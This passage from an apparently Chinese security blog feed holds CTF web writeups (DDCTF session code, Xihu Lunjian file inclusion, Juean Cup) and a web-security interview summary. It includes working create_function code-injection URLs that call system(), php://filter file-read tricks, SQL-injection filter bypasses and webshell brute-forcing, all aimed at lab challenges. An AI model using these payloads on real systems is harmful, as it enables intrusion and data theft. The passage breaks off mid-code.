class="comment">//如果session_read()返回为TRUE就进入下面三行</span></span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果session_read()返回为FLASE，就调用session_create()</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; <span class="comment">// 获取eancrykey，hint: ../config/flag.txt</span></span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p><p>其中在get_key() 注释写到 flag和eanccrykey在同一个文件夹</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2019西湖论剑writeup</title>
      <link href="/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91writeup/"/>
      <url>/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h1><p>看到<code>include $_GET[&#39;file&#39;]</code>尝试文件包含用<code>php://filter</code>读取index文件,成功读取 解码得到如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure></p><p>提示有dir.php 继续读取dir.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'dir'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$a)&#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'/tmp'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(scandir($a));</span></span><br></pre></td></tr></table></figure></p><p>分析:<br>index.php<br>获取file值 检查是否出现flag<br>dir.php<br>列出目录结构</p><p>先在dir.php中查看目录<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9205u1j30wh0ioq3x.jpg" alt=""><br>然后在index.php中读取<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yx9q7wypj30vs08laac.jpg" alt=""><br>解码得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1yxahyuwhj30um0fsmxk.jpg" alt=""></p><p># </p><p># </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>web安全相关面试总结</title>
      <link href="/2019/04/11/web%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/11/web%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>“如果一个人住，千万不要在下午时睡午觉，一觉睡到六七点等你一睁开眼，看着朦胧黑黑的天空，看着空荡的房间，会有一种被全世界遗弃的感觉，孤独在那一刻体现的淋漓尽致。”<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1ynhi655kj30k00k0wei.jpg" alt=""></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集和总结一些web安全面试可能会问到的问题，本文只是写个大概，提供一个方向，不会在某个问题讲太深，以下都是用本人通俗的话来讲，难免会有不正确的。</p><h1 id="基本漏洞讲解"><a href="#基本漏洞讲解" class="headerlink" title="基本漏洞讲解"></a>基本漏洞讲解</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>原理:</strong><br>没有对输入生成的数据进行过滤或过滤不当，能够通过构造构造恶意的输入来改变sql语句的结构</p><p><strong>判断</strong><br>通过构造条件语句，来查看页面是否发生变化，例如:加单引号,加 2-1，sleep()验证</p><p><strong>注入类型</strong><br>get<br>post<br>cookie</p><p><strong>注入方式</strong><br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span>注入</span></span><br><span class="line">利用<span class="class"><span class="keyword">union</span> <span class="title">slect</span> 等等</span></span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">利用rand()+floor(),exp(),updatexml(),polygon()等等</span><br><span class="line"></span><br><span class="line">盲注(bool盲注和时间盲注)</span><br><span class="line">利用subtr(),<span class="keyword">if</span>(),ascii()等等、</span><br><span class="line"></span><br><span class="line">宽字节注入</span><br></pre></td></tr></table></figure></p><p><strong>防御</strong><br>·使用预编译语句<br>·关闭错误提示<br>·强制类型转换</p><h2 id="跨站脚本XSS"><a href="#跨站脚本XSS" class="headerlink" title="跨站脚本XSS"></a>跨站脚本XSS</h2><p><strong>原理</strong><br>向网页写入恶意脚本，当其他用户进行浏览时，就会触发恶意代码进行恶意操作</p><p><strong>类型</strong><br>反射性(一次性)<br>一般在url中构造恶意代码，发送给其他用户点击执行相关操作</p><p>存储型(永久性)<br>一般在进行表单提交，比如留言板，在表单提交恶意代码存到数据库，当其他用户浏览时会触发，影响大量用户</p><p>dom型(基于)<br>通过修改dom结构来操作dom对象进行注入</p><p><strong>防御</strong><br>·进行转义输出<br>·设置httponly(禁止js获取cookie值)</p><h2 id="csrf-夸站请求伪造"><a href="#csrf-夸站请求伪造" class="headerlink" title="csrf(夸站请求伪造)"></a>csrf(夸站请求伪造)</h2><p><strong>原理</strong><br>服务器没有对请求来源进行过滤验证而导致受害者执行攻击代码，一般是在恶意网站向其他网站执行了恶意操作</p><p><strong>判断</strong><br>抓取正常请求包，去掉referer重新提交，如果提交还有效，说明存在ssrf</p><p><strong>防御</strong><br>设置token(服务器生成一个随机给客户端，客户点携带随机数进行请求)<br>验证refere</p><h2 id="ssrf-服务端请求伪造"><a href="#ssrf-服务端请求伪造" class="headerlink" title="ssrf(服务端请求伪造)"></a>ssrf(服务端请求伪造)</h2><p><strong>原理</strong><br>没有对服务器请求的内容进行过滤造成可以从外网访问内网进行攻击</p><p><strong>判断</strong><br>在图片地址或者url中进行构造</p><p><strong>防御</strong><br>·禁用不需要的协议 类似于<code>file:// , gopher://, ftp://</code><br>·限制端口</p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p><strong>原理</strong><br>当应用程序程序能够解析xml时，如果可以引用外部实体，可以通过构造恶意命令执行恶意操作，内网攻击，任意文件读取</p><p><strong>防御</strong><br>禁止对外部实体的访问<br>过滤xml数据</p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p><strong>IIS</strong><br>XX.ASP目录下的问价会被当做asp文件执行<br>xx.asp;.jpg ;表示截止，不会解析;后面的内容  会被当做asp文件执行</p><p><strong>Apache</strong><br>文件名解析从右到左</p><p><strong>Nginx</strong><br>xx.jpg/.php 会被当做php执行<br>存在00截断</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><strong>原理</strong><br>过滤包含文件函数中的参数可控 可导致任意文件</p><p>本地包含: 包含文件的参数可控 在进行包含时没有进行过滤 导致的夸目录读取文件<br>远程包含: 用户的输入没有进行过滤 通过访问远程服务器下的shell文件</p><p><strong>包含方式</strong><br>包含上传文件<br>利用伪协议，php://input(写一句话),data://(执行命令),php://filter(读取文件内容)<br>包含日志文件<br>包含session<br><strong>防御</strong><br>设置allow_url_include,关闭allow_url_fopen<br>使用open_basedir进行限制包含<br>过滤包含文件函数中的参数</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>原理</strong><br>没有对文件的后缀名过滤或者可绕过从而上传危险文件</p><p><strong>防御</strong><br>禁止上传目录有执行命令权限<br>文件路径名+文件名写死</p><h1 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h1><p><strong>apache和nginx区别</strong><br>apache 性能高 模块多 更稳定 动静编译<br>nigix 轻量级 静态编译</p><p><strong>怎么判断是否同源</strong><br>如果 两个页面的 协议 端口号 和 域名 相同  则两个页面 同源</p><p><strong>php.ini的一些安全配置</strong><br>打开安全模式<br>关闭危险函数<br>关闭注册全局变量<br>关闭错误回显<br>限制活动目录<br>增加错误日志</p><p><strong>如何进行信息收集</strong><br>获取真实ip<br>敏感目录扫描<br>子域名爆破<br>端口扫描<br>c段扫描<br>cms识别<br>中间件版本</p><p><strong>myslq注入 5.0 以上和5.0 以下有什么区别</strong><br>5.0以下没有information_schema 这个表</p><p><strong>SSRF 和 CSRF 有什么区别</strong><br>SSRF 由服务器发起<br>CSRF 有客户端发起</p><p><strong>cookie 与session 的区别</strong><br>cookie 存在于本地<br>sesion 存在于服务器 返回一个ID 作为一个cookie</p><p><strong>响应码了解多少</strong><br>404 文件不存在不<br>403 禁止访问<br>500 服务器错误<br>302 重定向<br>401 请求未经授权</p><p><strong>常见端口号</strong><br>22 ssh<br>21 ftp<br>23 telnet<br>443 https</p><p><strong>七层模型结构</strong><br>应用层 http ftp  dns<br>表示层 进行 解码与编码 加密解密<br>会话层 验证用户  断点续传<br>传输层 tip udp 建立连接<br>网络层 ip 进行选路<br>数据链路层<br>物理层</p><p><strong>XSS 和 CSRF 的区别？</strong><br>XSS：跨站脚本攻击，注重的是脚本，一般来说，吃什么吐什么 有脚本的参与，黑客构造好各种各样功能的脚本让你来触发。</p><p>CSRF：跨站请求伪造，注重的是跨站，伪造，也就是说重点在借刀杀人 借你的手触发某些操作。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2019年掘安杯writeup</title>
      <link href="/2019/04/08/2019%E5%B9%B4%E6%8E%98%E5%AE%89%E6%9D%AFwriteup/"/>
      <url>/2019/04/08/2019%E5%B9%B4%E6%8E%98%E5%AE%89%E6%9D%AFwriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $arg = $_GET[<span class="string">'arg'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action($arg,<span class="string">''</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>这是P神代码审计的题目，但是被改动了参数的位置<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg" alt=""><br>create_function注入分析：</p><p><a href="https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/">https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</a><br>在这道题中，可控的是第二个参数 通过加上 ‘)’ 闭合来进行注入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">action</span>=%5ccreate_function&amp;arg=)&#123;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vgxu71q7j30xc0e8go2.jpg" alt=""><br>接下只需改变phpinfo();代码进行注入即可<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(scandir(<span class="string">'../'</span>));/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh31m698j30rl0fct9d.jpg" alt=""><br>发现这道题没有想p神那道题一样禁用system()函数<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=)&#123;&#125;print_r(<span class="keyword">system</span>(<span class="keyword">ls</span>));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh2l1yc4j30py06r3yn.jpg" alt=""></p><p>接下来读取内容<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(include<span class="meta">%20Th1s_1S_F1a9_Hav3_Fun</span>);/*</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vh7tb46lj30y90bp74q.jpg" alt=""></p><h1 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhbz8twbj30ks07vglt.jpg" alt=""><br>呆呆地点击下载 如果发现没有flag~<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhd1ml6rj30ik07wq33.jpg" alt=""><br>查看源码 发现有flag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhej7juuj30lc07qt8p.jpg" alt=""><br>什么也没有 于是回过头看之前的源码 是否能够下载flag.php 或者是任意文件下载</p><p>下载flag.php成功 内容如下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>); <span class="regexp">//</span>网页编码</span><br><span class="line">function encrypt($data, $key) &#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= $key &#123;$x&#125;;</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( $data &#123;$i&#125; ) + (<span class="keyword">ord</span> ( $char &#123;$i&#125; )) % <span class="number">256</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key) &#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$data = base64_decode ( $data );</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= <span class="keyword">substr</span> ( $key, $x, <span class="number">1</span> );</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) &lt; <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) )) &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) + <span class="number">256</span>) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=<span class="string">"MyCTF"</span>;</span><br><span class="line">$flag=<span class="string">"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI="</span>;<span class="regexp">//encrypt</span>($flag,$key)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有encrypt() decrypt() 两个函数 分别是加密和解密函数<br>在最下面flag 是被加密过了 又因为有解密函数，于是直接调用解密函数即可<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhopg4bij30zt0fu0uk.jpg" alt=""></p><h1 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhqd2rcoj30w20hotbv.jpg" alt=""><br>一个炫酷的网页 被黑？ 于是拿御剑扫一下 发现shell.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhrguismj30sj0craaa.jpg" alt=""><br>需要密码<br>用burp导入字典进行暴力得到密码为hack<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vilesi7kj30il09emx7.jpg" alt=""></p><h1 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vimr76ubj30x60gx3zj.jpg" alt=""><br>随便输一下 发现有有回显<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vincefsuj30rt0bqq3o.jpg" alt=""><br>接下来用union注入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vjm38ucij30yt07z3zn.jpg" alt=""><br>其中:</p><ol><li>空格被过滤  用 <code>/**/</code>  绕过</li><li>union,select 关键字被过滤      双写绕过</li></ol><p>得到账号密码<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名<span class="symbol">:goodboy_g-</span><span class="number">60</span>Hellowor</span><br><span class="line"></span><br><span class="line">密码：ajahas&amp;&amp;*<span class="number">44</span>askldajaj</span><br></pre></td></tr></table></figure></p><p>接下来编写脚本提交</p><p>得到sss88ioiern.gdsgj.zip<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkcxr20qj30j205bt8v.jpg" alt=""><br>from1.txt是用VB写的代码  转换为pytohn代码为:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def getPassword(string):</span><br><span class="line"><span class="built_in">i</span> = <span class="number">1</span></span><br><span class="line">reString = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">i</span> &lt;= len(string) :</span><br><span class="line">reString = reString + string[<span class="built_in">i</span><span class="number">-1</span>]</span><br><span class="line"><span class="built_in">i</span> = <span class="built_in">i</span> + (<span class="built_in">i</span> <span class="comment">% 5)</span></span><br><span class="line"><span class="keyword">return</span> reString</span><br><span class="line"></span><br><span class="line">Dictionary = <span 